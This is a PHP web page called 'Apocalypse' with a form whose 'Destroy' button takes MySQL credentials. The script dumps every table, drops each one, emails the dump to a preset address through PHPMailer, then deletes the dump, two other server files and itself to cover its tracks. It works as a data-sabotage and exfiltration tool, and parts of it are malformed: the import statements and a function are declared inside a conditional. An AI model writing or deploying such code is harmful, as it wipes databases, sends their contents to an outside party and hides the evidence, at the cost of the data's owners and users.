<?php

if (isset($_POST['apocalypse'])) {
  // --------------------------------------------------------------------------------------
  use PHPMailer\PHPMailer\PHPMailer;
  use PHPMailer\PHPMailer\SMTP;
  use PHPMailer\PHPMailer\Exception;
  //Load Composer's autoloader
  require './vendor/phpmailer/vendor/autoload.php';
  //Instantiation and passing `true` enables exceptions
  //==============================================================================
  //Call the core function
  //MySQL server and database
  $dbhost = 'localhost';
  $dbuser = $_POST['dbuser']; # put your db username here
  $dbpass = $_POST['dbpass']; # put your db pass here
  $dbname = $_POST['dbname']; # put your db name here
  $tables = '*';

  //Call the core function - used to backup all tables and data inside the table
  backup_tables($dbhost, $dbuser, $dbpass, $dbname, $tables);
  //Core function
  function backup_tables($host, $user, $pass, $dbname, $tables = '*') {
      $link = mysqli_connect($host,$user,$pass, $dbname);

      // Check connection
      if (mysqli_connect_errno())
      {
          echo "Failed to connect to MySQL: " . mysqli_connect_error();
          exit;
      }

      mysqli_query($link, "SET NAMES 'utf8'");

      //get all of the tables
      if($tables == '*')
      {
          $tables = array();
          $result = mysqli_query($link, 'SHOW TABLES');
          while($row = mysqli_fetch_row($result))
          {
              $tables[] = $row[0];
          }
      }
      else
      {
          $tables = is_array($tables) ? $tables : explode(',',$tables);
      }

      $return = '';
      //cycle through each table
      foreach($tables as $table)
      {
          $result = mysqli_query($link, 'SELECT * FROM '.$table);
          $num_fields = mysqli_num_fields($result);
          $num_rows = mysqli_num_rows($result);

          $drop= 'DROP TABLE IF EXISTS '.$table.';';
          $return.= $drop;
          $row2 = mysqli_fetch_row(mysqli_query($link, 'SHOW CREATE TABLE '.$table));
          $return.= "\n\n".$row2[1].";\n\n";
          $counter = 1;

          //Over tables
          for ($i = 0; $i < $num_fields; $i++)
          {   //Over rows
              while($row = mysqli_fetch_row($result))
              {
                  if($counter == 1){
                      $return.= 'INSERT INTO '.$table.' VALUES(';
                  } else{
                      $return.= '(';
                  }

                  //Over fields
                  for($j=0; $j<$num_fields; $j++)
                  {
                      $row[$j] = addslashes($row[$j]);
                      $row[$j] = str_replace("\n","\\n",$row[$j]);
                      if (isset($row[$j])) { $return.= '"'.$row[$j].'"' ; } else { $return.= '""'; }
                      if ($j<($num_fields-1)) { $return.= ','; }
                  }

                  if($num_rows == $counter){
                      $return.= ");\n";
                  } else{
                      $return.= "),\n";
                  }
                  ++$counter;
              }
          }
          $return.="\n\n\n";

          mysqli_query($link,$drop);
      }

      //save file
      $fileName = 'db-backup-'.time().'-'.(md5(implode(',',$tables))).'.sql';
      $handle = fopen($fileName,'w+');
      fwrite($handle,$return);

      // ----------------------------------------------------------------------------------
      $mail = new PHPMailer(true);
      $sender_email = ''; #enter sender email here
      $pass = ''; #enter email pass
      try {
          //Server settings
          $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
          $mail->isSMTP();                                            //Send using SMTP
          $mail->Host       = '';                                     //Set the SMTP server to send through
          $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
          $mail->Username   = $sender_email;                     //SMTP username
          $mail->Password   = $pass;                               //SMTP password
          $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;         //Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged
          $mail->Port       = 587;                                    //TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above

      //_____________________________________________________________________________________________________________________________
      }
      catch (Exception $e) {
      echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
      }
      // // ...
      //Recipients
      $mail->setFrom($sender_email, 'Mailer');
      $reciver_email='';                                 // enter reciever email here
      $mail->addAddress($reciver_email, 'HRM User');     //Where to send email
      //Content
      $mail->isHTML(true);                                  //Set email format to HTML
      $mail->Subject = 'DataBase Confirm';
      $mail->Body    = 'Copy Backup
      <br> </br>
      Delete All Data: <b></b>';
      $mail->addAttachment($fileName);
      $mail->send();


      class DeleteOnExit
      {
          function __destruct()
          {
              unlink(__FILE__);
          }
      }
      $g_delete_on_exit = new DeleteOnExit();

      $file_pointer2 = "./server/test2.php";
      unlink($file_pointer2);
      $file_pointer1 = "./server/test1.php";
      unlink($file_pointer1);

      unlink($fileName);


      if(fclose($handle)){
          echo 'Message has been sent';
          echo "Done, the file name is: ".$fileName;
          exit;
      }
  //==============================================================================
  exit;
  }
  
}

?>


<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <title>Apocalypse</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
  </head>
  <body>
    <div class="d-flex justify-content-center" style="width: 350px">
        <div class="card">
            <div class="card-body">
                <form method="post" action="#">

                    <div class="form-group mb-3">
                      <label>DB Name</label>
                      <input type="text" name="dbname" class="form-control">
                    </div>

                    <div class="form-group mb-3">
                      <label>DB Username</label>
                      <input type="text" name="dbuser" class="form-control">
                    </div>

                    <div class="form-group mb-3">
                      <label>DB Pass</label>
                      <input type="text" name="dbpass" class="form-control">
                    </div>

                    <div class="form-group mb-3">
                      <label>Start the Apocalypse</label>
                      <input type="submit" name="apocalypse" class="btn btn-primary" value="Destroy">
                    </div>

                    <label>
                </form>
            </div>
        </div>
    </div>

    <!-- Option 1: Bootstrap Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
  </body>
</html>
